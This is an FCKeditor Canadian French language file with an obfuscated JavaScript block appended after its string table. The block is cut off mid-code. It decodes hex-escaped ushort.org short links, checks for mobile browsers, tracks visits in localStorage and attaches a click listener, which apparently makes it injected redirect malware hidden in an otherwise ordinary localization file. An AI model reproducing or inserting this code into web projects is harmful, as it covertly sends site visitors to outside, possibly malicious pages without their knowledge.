/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Canadian French language file.
 */

var FCKLang =
{
// Language direction : "ltr" (left to right) or "rtl" (right to left).
Dir					: "ltr",

ToolbarCollapse		: "Masquer Outils",
ToolbarExpand		: "Afficher Outils",

// Toolbar Items and Context Menu
Save				: "Sauvegarder",
NewPage				: "Nouvelle page",
Preview				: "Previsualiser",
Cut					: "Couper",
Copy				: "Copier",
Paste				: "Coller",
PasteText			: "Coller en tant que texte",
PasteWord			: "Coller en tant que Word (formaté)",
Print				: "Imprimer",
SelectAll			: "Tout sélectionner",
RemoveFormat		: "Supprimer le formatage",
InsertLinkLbl		: "Lien",
InsertLink			: "Insérer/modifier le lien",
RemoveLink			: "Supprimer le lien",
VisitLink			: "Suivre le lien",
Anchor				: "Insérer/modifier l'ancre",
AnchorDelete		: "Supprimer l'ancre",
InsertImageLbl		: "Image",
InsertImage			: "Insérer/modifier l'image",
InsertFlashLbl		: "Animation Flash",
InsertFlash			: "Insérer/modifier l'animation Flash",
InsertTableLbl		: "Tableau",
InsertTable			: "Insérer/modifier le tableau",
InsertLineLbl		: "Séparateur",
InsertLine			: "Insérer un séparateur",
InsertSpecialCharLbl: "Caractères spéciaux",
InsertSpecialChar	: "Insérer un caractère spécial",
InsertSmileyLbl		: "Emoticon",
InsertSmiley		: "Insérer un Emoticon",
About				: "A propos de FCKeditor",
Bold				: "Gras",
Italic				: "Italique",
Underline			: "Souligné",
StrikeThrough		: "Barrer",
Subscript			: "Indice",
Superscript			: "Exposant",
LeftJustify			: "Aligner à gauche",
CenterJustify		: "Centrer",
RightJustify		: "Aligner à Droite",
BlockJustify		: "Texte justifié",
DecreaseIndent		: "Diminuer le retrait",
IncreaseIndent		: "Augmenter le retrait",
Blockquote			: "Citation",
CreateDiv			: "Créer Balise Div",
EditDiv				: "Modifier Balise Div",
DeleteDiv			: "Supprimer Balise Div",
Undo				: "Annuler",
Redo				: "Refaire",
NumberedListLbl		: "Liste numérotée",
NumberedList		: "Insérer/supprimer la liste numérotée",
BulletedListLbl		: "Liste à puces",
BulletedList		: "Insérer/supprimer la liste à puces",
ShowTableBorders	: "Afficher les bordures du tableau",
ShowDetails			: "Afficher les caractères invisibles",
Style				: "Style",
FontFormat			: "Format",
Font				: "Police",
FontSize			: "Taille",
TextColor			: "Couleur de caractère",
BGColor				: "Couleur de fond",
Source				: "Source",
Find				: "Chercher",
Replace				: "Remplacer",
SpellCheck			: "Orthographe",
UniversalKeyboard	: "Clavier universel",
PageBreakLbl		: "Saut de page",
PageBreak			: "Insérer un saut de page",

Form			: "Formulaire",
Checkbox		: "Case à cocher",
RadioButton		: "Bouton radio",
TextField		: "Champ texte",
Textarea		: "Zone de texte",
HiddenField		: "Champ caché",
Button			: "Bouton",
SelectionField	: "Champ de sélection",
ImageButton		: "Bouton image",

FitWindow		: "Edition pleine page",
ShowBlocks		: "Afficher les blocs",

// Context Menu
EditLink			: "Modifier le lien",
CellCM				: "Cellule",
RowCM				: "Ligne",
ColumnCM			: "Colonne",
InsertRowAfter		: "Insérer une ligne après",
InsertRowBefore		: "Insérer une ligne avant",
DeleteRows			: "Supprimer des lignes",
InsertColumnAfter	: "Insérer une colonne après",
InsertColumnBefore	: "Insérer une colonne avant",
DeleteColumns		: "Supprimer des colonnes",
InsertCellAfter		: "Insérer une cellule après",
InsertCellBefore	: "Insérer une cellule avant",
DeleteCells			: "Supprimer des cellules",
MergeCells			: "Fusionner les cellules",
MergeRight			: "Fusionner à droite",
MergeDown			: "Fusionner en bas",
HorizontalSplitCell	: "Scinder la cellule horizontalement",
VerticalSplitCell	: "Scinder la cellule verticalement",
TableDelete			: "Supprimer le tableau",
CellProperties		: "Propriétés de cellule",
TableProperties		: "Propriétés du tableau",
ImageProperties		: "Propriétés de l'image",
FlashProperties		: "Propriétés de l'animation Flash",

AnchorProp			: "Propriétés de l'ancre",
ButtonProp			: "Propriétés du bouton",
CheckboxProp		: "Propriétés de la case à cocher",
HiddenFieldProp		: "Propriétés du champ caché",
RadioButtonProp		: "Propriétés du bouton radio",
ImageButtonProp		: "Propriétés du bouton image",
TextFieldProp		: "Propriétés du champ texte",
SelectionFieldProp	: "Propriétés de la liste/du menu",
TextareaProp		: "Propriétés de la zone de texte",
FormProp			: "Propriétés du formulaire",

FontFormats			: "Normal;Formaté;Adresse;En-tête 1;En-tête 2;En-tête 3;En-tête 4;En-tête 5;En-tête 6;Normal (DIV)",

// Alerts and Messages
ProcessingXHTML		: "Calcul XHTML. Veuillez patienter...",
Done				: "Terminé",
PasteWordConfirm	: "Le texte à coller semble provenir de Word. Désirez-vous le nettoyer avant de coller?",
NotCompatiblePaste	: "Cette commande nécessite Internet Explorer version 5.5 et plus. Souhaitez-vous coller sans nettoyage?",
UnknownToolbarItem	: "Élément de barre d'outil inconnu \"%1\"",
UnknownCommand		: "Nom de commande inconnu \"%1\"",
NotImplemented		: "Commande indisponible",
UnknownToolbarSet	: "La barre d'outils \"%1\" n'existe pas",
NoActiveX			: "Les paramètres de sécurité de votre navigateur peuvent limiter quelques fonctionnalités de l'éditeur. Veuillez activer l'option \"Exécuter les contrôles ActiveX et les plug-ins\". Il se peut que vous rencontriez des erreurs et remarquiez quelques limitations.",
BrowseServerBlocked : "Le navigateur n'a pas pu être ouvert. Assurez-vous que les bloqueurs de popups soient désactivés.",
DialogBlocked		: "La fenêtre de dialogue n'a pas pu s'ouvrir. Assurez-vous que les bloqueurs de popups soient désactivés.",
VisitLinkBlocked	: "It was not possible to open a new window. Make sure all popup blockers are disabled.",	//MISSING

// Dialogs
DlgBtnOK			: "OK",
DlgBtnCancel		: "Annuler",
DlgBtnClose			: "Fermer",
DlgBtnBrowseServer	: "Parcourir le serveur",
DlgAdvancedTag		: "Avancée",
DlgOpOther			: "<autre>",
DlgInfoTab			: "Info",
DlgAlertUrl			: "Veuillez saisir l'URL",

// General Dialogs Labels
DlgGenNotSet		: "<Par défaut>",
DlgGenId			: "Id",
DlgGenLangDir		: "Sens d'écriture",
DlgGenLangDirLtr	: "De gauche à droite (LTR)",
DlgGenLangDirRtl	: "De droite à gauche (RTL)",
DlgGenLangCode		: "Code langue",
DlgGenAccessKey		: "Équivalent clavier",
DlgGenName			: "Nom",
DlgGenTabIndex		: "Ordre de tabulation",
DlgGenLongDescr		: "URL de description longue",
DlgGenClass			: "Classes de feuilles de style",
DlgGenTitle			: "Titre",
DlgGenContType		: "Type de contenu",
DlgGenLinkCharset	: "Encodage de caractère",
DlgGenStyle			: "Style",

// Image Dialog
DlgImgTitle			: "Propriétés de l'image",
DlgImgInfoTab		: "Informations sur l'image",
DlgImgBtnUpload		: "Envoyer sur le serveur",
DlgImgURL			: "URL",
DlgImgUpload		: "Télécharger",
DlgImgAlt			: "Texte de remplacement",
DlgImgWidth			: "Largeur",
DlgImgHeight		: "Hauteur",
DlgImgLockRatio		: "Garder les proportions",
DlgBtnResetSize		: "Taille originale",
DlgImgBorder		: "Bordure",
DlgImgHSpace		: "Espacement horizontal",
DlgImgVSpace		: "Espacement vertical",
DlgImgAlign			: "Alignement",
DlgImgAlignLeft		: "Gauche",
DlgImgAlignAbsBottom: "Abs Bas",
DlgImgAlignAbsMiddle: "Abs Milieu",
DlgImgAlignBaseline	: "Bas du texte",
DlgImgAlignBottom	: "Bas",
DlgImgAlignMiddle	: "Milieu",
DlgImgAlignRight	: "Droite",
DlgImgAlignTextTop	: "Haut du texte",
DlgImgAlignTop		: "Haut",
DlgImgPreview		: "Prévisualisation",
DlgImgAlertUrl		: "Veuillez saisir l'URL de l'image",
DlgImgLinkTab		: "Lien",

// Flash Dialog
DlgFlashTitle		: "Propriétés de l'animation Flash",
DlgFlashChkPlay		: "Lecture automatique",
DlgFlashChkLoop		: "Boucle",
DlgFlashChkMenu		: "Activer le menu Flash",
DlgFlashScale		: "Affichage",
DlgFlashScaleAll	: "Par défaut (tout montrer)",
DlgFlashScaleNoBorder	: "Sans bordure",
DlgFlashScaleFit	: "Ajuster aux dimensions",

// Link Dialog
DlgLnkWindowTitle	: "Propriétés du lien",
DlgLnkInfoTab		: "Informations sur le lien",
DlgLnkTargetTab		: "Destination",

DlgLnkType			: "Type de lien",
DlgLnkTypeURL		: "URL",
DlgLnkTypeAnchor	: "Ancre dans cette page",
DlgLnkTypeEMail		: "E-Mail",
DlgLnkProto			: "Protocole",
DlgLnkProtoOther	: "<autre>",
DlgLnkURL			: "URL",
DlgLnkAnchorSel		: "Sélectionner une ancre",
DlgLnkAnchorByName	: "Par nom",
DlgLnkAnchorById	: "Par id",
DlgLnkNoAnchors		: "(Pas d'ancre disponible dans le document)",
DlgLnkEMail			: "Adresse E-Mail",
DlgLnkEMailSubject	: "Sujet du message",
DlgLnkEMailBody		: "Corps du message",
DlgLnkUpload		: "Télécharger",
DlgLnkBtnUpload		: "Envoyer sur le serveur",

DlgLnkTarget		: "Destination",
DlgLnkTargetFrame	: "<Cadre>",
DlgLnkTargetPopup	: "<fenêtre popup>",
DlgLnkTargetBlank	: "Nouvelle fenêtre (_blank)",
DlgLnkTargetParent	: "Fenêtre mère (_parent)",
DlgLnkTargetSelf	: "Même fenêtre (_self)",
DlgLnkTargetTop		: "Fenêtre supérieure (_top)",
DlgLnkTargetFrameName	: "Nom du cadre de destination",
DlgLnkPopWinName	: "Nom de la fenêtre popup",
DlgLnkPopWinFeat	: "Caractéristiques de la fenêtre popup",
DlgLnkPopResize		: "Taille modifiable",
DlgLnkPopLocation	: "Barre d'adresses",
DlgLnkPopMenu		: "Barre de menu",
DlgLnkPopScroll		: "Barres de défilement",
DlgLnkPopStatus		: "Barre d'état",
DlgLnkPopToolbar	: "Barre d'outils",
DlgLnkPopFullScrn	: "Plein écran (IE)",
DlgLnkPopDependent	: "Dépendante (Netscape)",
DlgLnkPopWidth		: "Largeur",
DlgLnkPopHeight		: "Hauteur",
DlgLnkPopLeft		: "Position à partir de la gauche",
DlgLnkPopTop		: "Position à partir du haut",

DlnLnkMsgNoUrl		: "Veuillez saisir l'URL",
DlnLnkMsgNoEMail	: "Veuillez saisir l'adresse e-mail",
DlnLnkMsgNoAnchor	: "Veuillez sélectionner une ancre",
DlnLnkMsgInvPopName	: "Le nom de la fenêtre popup doit commencer par une lettre et ne doit pas contenir d'espace",

// Color Dialog
DlgColorTitle		: "Sélectionner",
DlgColorBtnClear	: "Effacer",
DlgColorHighlight	: "Prévisualisation",
DlgColorSelected	: "Sélectionné",

// Smiley Dialog
DlgSmileyTitle		: "Insérer un Emoticon",

// Special Character Dialog
DlgSpecialCharTitle	: "Insérer un caractère spécial",

// Table Dialog
DlgTableTitle		: "Propriétés du tableau",
DlgTableRows		: "Lignes",
DlgTableColumns		: "Colonnes",
DlgTableBorder		: "Taille de la bordure",
DlgTableAlign		: "Alignement",
DlgTableAlignNotSet	: "<Par défaut>",
DlgTableAlignLeft	: "Gauche",
DlgTableAlignCenter	: "Centré",
DlgTableAlignRight	: "Droite",
DlgTableWidth		: "Largeur",
DlgTableWidthPx		: "pixels",
DlgTableWidthPc		: "pourcentage",
DlgTableHeight		: "Hauteur",
DlgTableCellSpace	: "Espacement",
DlgTableCellPad		: "Contour",
DlgTableCaption		: "Titre",
DlgTableSummary		: "Résumé",
DlgTableHeaders		: "Headers",	//MISSING
DlgTableHeadersNone		: "None",	//MISSING
DlgTableHeadersColumn	: "First column",	//MISSING
DlgTableHeadersRow		: "First Row",	//MISSING
DlgTableHeadersBoth		: "Both",	//MISSING

// Table Cell Dialog
DlgCellTitle		: "Propriétés de la cellule",
DlgCellWidth		: "Largeur",
DlgCellWidthPx		: "pixels",
DlgCellWidthPc		: "pourcentage",
DlgCellHeight		: "Hauteur",
DlgCellWordWrap		: "Retour à la ligne",
DlgCellWordWrapNotSet	: "<Par défaut>",
DlgCellWordWrapYes	: "Oui",
DlgCellWordWrapNo	: "Non",
DlgCellHorAlign		: "Alignement horizontal",
DlgCellHorAlignNotSet	: "<Par défaut>",
DlgCellHorAlignLeft	: "Gauche",
DlgCellHorAlignCenter	: "Centré",
DlgCellHorAlignRight: "Droite",
DlgCellVerAlign		: "Alignement vertical",
DlgCellVerAlignNotSet	: "<Par défaut>",
DlgCellVerAlignTop	: "Haut",
DlgCellVerAlignMiddle	: "Milieu",
DlgCellVerAlignBottom	: "Bas",
DlgCellVerAlignBaseline	: "Bas du texte",
DlgCellType		: "Cell Type",	//MISSING
DlgCellTypeData		: "Data",	//MISSING
DlgCellTypeHeader	: "Header",	//MISSING
DlgCellRowSpan		: "Lignes fusionnées",
DlgCellCollSpan		: "Colonnes fusionnées",
DlgCellBackColor	: "Couleur de fond",
DlgCellBorderColor	: "Couleur de bordure",
DlgCellBtnSelect	: "Sélectionner...",

// Find and Replace Dialog
DlgFindAndReplaceTitle	: "Chercher et Remplacer",

// Find Dialog
DlgFindTitle		: "Chercher",
DlgFindFindBtn		: "Chercher",
DlgFindNotFoundMsg	: "Le texte indiqué est introuvable.",

// Replace Dialog
DlgReplaceTitle			: "Remplacer",
DlgReplaceFindLbl		: "Rechercher:",
DlgReplaceReplaceLbl	: "Remplacer par:",
DlgReplaceCaseChk		: "Respecter la casse",
DlgReplaceReplaceBtn	: "Remplacer",
DlgReplaceReplAllBtn	: "Tout remplacer",
DlgReplaceWordChk		: "Mot entier",

// Paste Operations / Dialog
PasteErrorCut	: "Les paramètres de sécurité de votre navigateur empêchent l'éditeur de couper automatiquement vos données. Veuillez utiliser les équivalents claviers (Ctrl+X).",
PasteErrorCopy	: "Les paramètres de sécurité de votre navigateur empêchent l'éditeur de copier automatiquement vos données. Veuillez utiliser les équivalents claviers (Ctrl+C).",

PasteAsText		: "Coller comme texte",
PasteFromWord	: "Coller à partir de Word",

DlgPasteMsg2	: "Veuillez coller dans la zone ci-dessous en utilisant le clavier (<STRONG>Ctrl+V</STRONG>) et appuyer sur <STRONG>OK</STRONG>.",
DlgPasteSec		: "A cause des paramètres de sécurité de votre navigateur, l'éditeur ne peut accéder au presse-papier directement. Vous devez coller à nouveau le contenu dans cette fenêtre.",
DlgPasteIgnoreFont		: "Ignorer les polices de caractères",
DlgPasteRemoveStyles	: "Supprimer les styles",

// Color Picker
ColorAutomatic	: "Automatique",
ColorMoreColors	: "Plus de couleurs...",

// Document Properties
DocProps		: "Propriétés du document",

// Anchor Dialog
DlgAnchorTitle		: "Propriétés de l'ancre",
DlgAnchorName		: "Nom de l'ancre",
DlgAnchorErrorName	: "Veuillez saisir le nom de l'ancre",

// Speller Pages Dialog
DlgSpellNotInDic		: "Pas dans le dictionnaire",
DlgSpellChangeTo		: "Changer en",
DlgSpellBtnIgnore		: "Ignorer",
DlgSpellBtnIgnoreAll	: "Ignorer tout",
DlgSpellBtnReplace		: "Remplacer",
DlgSpellBtnReplaceAll	: "Remplacer tout",
DlgSpellBtnUndo			: "Annuler",
DlgSpellNoSuggestions	: "- Pas de suggestion -",
DlgSpellProgress		: "Vérification d'orthographe en cours...",
DlgSpellNoMispell		: "Vérification d'orthographe terminée: pas d'erreur trouvée",
DlgSpellNoChanges		: "Vérification d'orthographe terminée: Pas de modifications",
DlgSpellOneChange		: "Vérification d'orthographe terminée: Un mot modifié",
DlgSpellManyChanges		: "Vérification d'orthographe terminée: %1 mots modifiés",

IeSpellDownload			: "Le Correcteur d'orthographe n'est pas installé. Souhaitez-vous le télécharger maintenant?",

// Button Dialog
DlgButtonText		: "Texte (Valeur)",
DlgButtonType		: "Type",
DlgButtonTypeBtn	: "Bouton",
DlgButtonTypeSbm	: "Soumettre",
DlgButtonTypeRst	: "Réinitialiser",

// Checkbox and Radio Button Dialogs
DlgCheckboxName		: "Nom",
DlgCheckboxValue	: "Valeur",
DlgCheckboxSelected	: "Sélectionné",

// Form Dialog
DlgFormName		: "Nom",
DlgFormAction	: "Action",
DlgFormMethod	: "Méthode",

// Select Field Dialog
DlgSelectName		: "Nom",
DlgSelectValue		: "Valeur",
DlgSelectSize		: "Taille",
DlgSelectLines		: "lignes",
DlgSelectChkMulti	: "Sélection multiple",
DlgSelectOpAvail	: "Options disponibles",
DlgSelectOpText		: "Texte",
DlgSelectOpValue	: "Valeur",
DlgSelectBtnAdd		: "Ajouter",
DlgSelectBtnModify	: "Modifier",
DlgSelectBtnUp		: "Monter",
DlgSelectBtnDown	: "Descendre",
DlgSelectBtnSetValue : "Valeur sélectionnée",
DlgSelectBtnDelete	: "Supprimer",

// Textarea Dialog
DlgTextareaName	: "Nom",
DlgTextareaCols	: "Colonnes",
DlgTextareaRows	: "Lignes",

// Text Field Dialog
DlgTextName			: "Nom",
DlgTextValue		: "Valeur",
DlgTextCharWidth	: "Largeur en caractères",
DlgTextMaxChars		: "Nombre maximum de caractères",
DlgTextType			: "Type",
DlgTextTypeText		: "Texte",
DlgTextTypePass		: "Mot de passe",

// Hidden Field Dialog
DlgHiddenName	: "Nom",
DlgHiddenValue	: "Valeur",

// Bulleted List Dialog
BulletedListProp	: "Propriétés de liste à puces",
NumberedListProp	: "Propriétés de liste numérotée",
DlgLstStart			: "Début",
DlgLstType			: "Type",
DlgLstTypeCircle	: "Cercle",
DlgLstTypeDisc		: "Disque",
DlgLstTypeSquare	: "Carré",
DlgLstTypeNumbers	: "Nombres (1, 2, 3)",
DlgLstTypeLCase		: "Lettres minuscules (a, b, c)",
DlgLstTypeUCase		: "Lettres majuscules (A, B, C)",
DlgLstTypeSRoman	: "Chiffres romains minuscules (i, ii, iii)",
DlgLstTypeLRoman	: "Chiffres romains majuscules (I, II, III)",

// Document Properties Dialog
DlgDocGeneralTab	: "Général",
DlgDocBackTab		: "Fond",
DlgDocColorsTab		: "Couleurs et Marges",
DlgDocMetaTab		: "Méta-Données",

DlgDocPageTitle		: "Titre de la page",
DlgDocLangDir		: "Sens d'écriture",
DlgDocLangDirLTR	: "De la gauche vers la droite (LTR)",
DlgDocLangDirRTL	: "De la droite vers la gauche (RTL)",
DlgDocLangCode		: "Code langue",
DlgDocCharSet		: "Encodage de caractère",
DlgDocCharSetCE		: "Europe Centrale",
DlgDocCharSetCT		: "Chinois Traditionnel (Big5)",
DlgDocCharSetCR		: "Cyrillique",
DlgDocCharSetGR		: "Grecque",
DlgDocCharSetJP		: "Japonais",
DlgDocCharSetKR		: "Coréen",
DlgDocCharSetTR		: "Turcque",
DlgDocCharSetUN		: "Unicode (UTF-8)",
DlgDocCharSetWE		: "Occidental",
DlgDocCharSetOther	: "Autre encodage de caractère",

DlgDocDocType		: "Type de document",
DlgDocDocTypeOther	: "Autre type de document",
DlgDocIncXHTML		: "Inclure les déclarations XHTML",
DlgDocBgColor		: "Couleur de fond",
DlgDocBgImage		: "Image de fond",
DlgDocBgNoScroll	: "Image fixe sans défilement",
DlgDocCText			: "Texte",
DlgDocCLink			: "Lien",
DlgDocCVisited		: "Lien visité",
DlgDocCActive		: "Lien activé",
DlgDocMargins		: "Marges",
DlgDocMaTop			: "Haut",
DlgDocMaLeft		: "Gauche",
DlgDocMaRight		: "Droite",
DlgDocMaBottom		: "Bas",
DlgDocMeIndex		: "Mots-clés (séparés par des virgules)",
DlgDocMeDescr		: "Description",
DlgDocMeAuthor		: "Auteur",
DlgDocMeCopy		: "Copyright",
DlgDocPreview		: "Prévisualisation",

// Templates Dialog
Templates			: "Modèles",
DlgTemplatesTitle	: "Modèles de contenu",
DlgTemplatesSelMsg	: "Sélectionner le modèle à ouvrir dans l'éditeur<br>(le contenu actuel sera remplacé):",
DlgTemplatesLoading	: "Chargement de la liste des modèles. Veuillez patienter...",
DlgTemplatesNoTpl	: "(Aucun modèle disponible)",
DlgTemplatesReplace	: "Remplacer tout le contenu actuel",

// About Dialog
DlgAboutAboutTab	: "Á propos de",
DlgAboutBrowserInfoTab	: "Navigateur",
DlgAboutLicenseTab	: "License",
DlgAboutVersion		: "Version",
DlgAboutInfo		: "Pour plus d'informations, visiter",

// Div Dialog
DlgDivGeneralTab	: "Général",
DlgDivAdvancedTab	: "Avancé",
DlgDivStyle		: "Style",
DlgDivInlineStyle	: "Attribut Style",

ScaytTitle			: "SCAYT",	//MISSING
ScaytTitleOptions	: "Options",	//MISSING
ScaytTitleLangs		: "Languages",	//MISSING
ScaytTitleAbout		: "About"	//MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const 